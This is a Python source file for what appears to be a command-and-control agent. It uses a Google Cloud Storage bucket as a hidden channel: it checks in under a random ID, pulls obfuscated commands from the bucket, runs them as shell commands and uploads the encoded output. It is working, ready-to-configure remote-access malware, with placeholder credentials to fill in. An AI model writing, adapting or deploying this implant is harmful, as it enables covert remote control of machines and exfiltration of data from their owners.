from google.cloud import storage
from google.oauth2 import service_account
from google.cloud.storage.bucket import Bucket
from google.cloud.storage.blob import Blob
from google.cloud.storage.client import Client 
import urllib
import base64
import uuid
from time import sleep
import shlex
import subprocess
import threading

info = {
    "type": "service_account",
    "project_id": "<YOUR PROJECT>",
    "private_key_id": "<PRIVATE KEY ID>",
    "private_key": "<PRIVATE KER OF SERVICE ACCOUNT>",
    "client_email": "<SERVICE_ACCOUNT_EMAIL>",
    "client_id": "<CLIENT ID HERE>",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/<SERVICE_ACCOUNT_EMAIL>",
    "universe_domain": "googleapis.com"
}

credentials = service_account.Credentials.from_service_account_info(info)

class GCPAgent:
    def __init__(self, bucket_name, credentials):
        self.bucket_name = bucket_name
        self.client = Client(credentials=credentials)
        self.bucket = Bucket(self.client, name=bucket_name)
        self.agent_id = str(uuid.uuid4())
        self.task_key_name = f"{self.agent_id}:TaskForYou"
        self.resp_key_name = f"{self.agent_id}:RespForYou"
        self.check_in_interval = 5  # seconds
        self.stop_flag = threading.Event()

    def encode(self, data):
        data = base64.b64encode(data.encode()).decode()
        return urllib.parse.quote_plus(data)[::-1]

    def decode(self, data):
        data = urllib.parse.unquote(data[::-1])
        return base64.b64decode(data).decode()

    def send_data(self, data):
        resp_key = f"{self.resp_key_name}:{str(uuid.uuid4())}"
        blob = self.bucket.blob(resp_key)
        blob.upload_from_string(self.encode(data))
        print(f'Sent {len(data)} bytes')

    def recv_data(self):
        while True:
            try:
                objects = self.bucket.list_blobs(prefix=self.task_key_name)
                tasks = []
                for obj in objects:
                    msg = obj.download_as_text()
                    msg = self.decode(msg)
                    tasks.append(msg)
                    obj.delete()
                if tasks:
                    return tasks
                print('[-] No data to retrieve yet. Sleeping...')
                sleep(5)
            except Exception as e:
                print(f"Error receiving data: {e}")
                sleep(5)

    def check_in(self):
        key_name = f"AGENT:{self.agent_id}"
        blob = self.bucket.blob(key_name)
        blob.upload_from_string("")
        print(f"[+] Agent {self.agent_id[:8]} checked in")

    def periodic_check_in(self):
        while not self.stop_flag.is_set():
            self.check_in()
            sleep(self.check_in_interval)

    def execute_task(self, task):
        try:
            args = shlex.split(task)
            
            result = subprocess.run(args, capture_output=True, text=True, timeout=60)
            
            response = f"Command: {task}\n"
            response += f"Exit code: {result.returncode}\n"
            response += f"Stdout: {result.stdout}\n"
            response += f"Stderr: {result.stderr}"
            
            return response
        except subprocess.TimeoutExpired:
            return f"Command timed out: {task}"
        except Exception as e:
            return f"Error executing command: {task}\nError: {str(e)}"

    

    def run(self):
        self.check_in()  # Initial check-in
        check_in_thread = threading.Thread(target=self.periodic_check_in)
        check_in_thread.start()

        print("Waiting for tasks...")
        try:
            while True:
                tasks = self.recv_data()
                for task in tasks:
                    print(f"Received task: {task}")
                    result = self.execute_task(task)
                    print(f"Processed task: {task}")
                    self.send_data(result)
        except KeyboardInterrupt:
            print("Caught escape signal")
        finally:
            self.stop_flag.set()
            check_in_thread.join()

bucket_name = '<YOUR BUCKET HERE>'

agent = GCPAgent(bucket_name, credentials)
agent.run()

